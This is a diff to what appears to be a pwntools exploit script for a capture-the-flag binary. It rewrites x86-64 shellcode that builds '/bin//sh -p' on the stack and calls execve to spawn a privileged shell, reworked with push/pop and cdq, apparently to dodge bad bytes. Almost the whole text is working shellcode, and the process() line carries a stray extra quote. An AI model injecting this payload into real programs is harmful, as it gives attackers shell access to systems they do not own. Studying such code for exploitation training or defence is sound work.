@@ -7,30 +7,34 @@ p = process('PATH_TO_THE_CHALLENGE_FILE'')
 #  Embed assembly instructions in Python.
 shellcode ="""
 _start:
+   
    SPAWN_SHELL:
-        xor rax, rax 
-
-        push rax
-        mov  rcx, 0x68732F2f6e69622F
-        push rcx
-        xor  rdi, rdi
-        mov  rdi, rsp
-
-        push rax
-        xor rcx, rcx
-        push 0x702d
-        mov rcx, rsp
-
-        push rax
-        push rcx
-        push rdi
-        xor  rsi, rsi
-        mov rsi, rsp
-
-        xor  rdx, rdx
-
-        mov al, 59
-        syscall
+      xor rax, rax 
+      
+      push rax
+      mov  rcx, 0x68732F2f6e69622F
+      push rcx
+      push rsp
+      xor  rdi, rdi 
+      pop  rdi
+      
+      push rax
+      xor rcx, rcx
+      push rsp
+      pop rcx
+      add word ptr [rcx], 0x702d
+      
+      push rax
+      push rcx
+      push rdi
+      push rsp
+      xor  rsi, rsi 
+      pop rsi
+      
+      cdq
+      
+      mov al, 59
+      syscall
 
 """
 
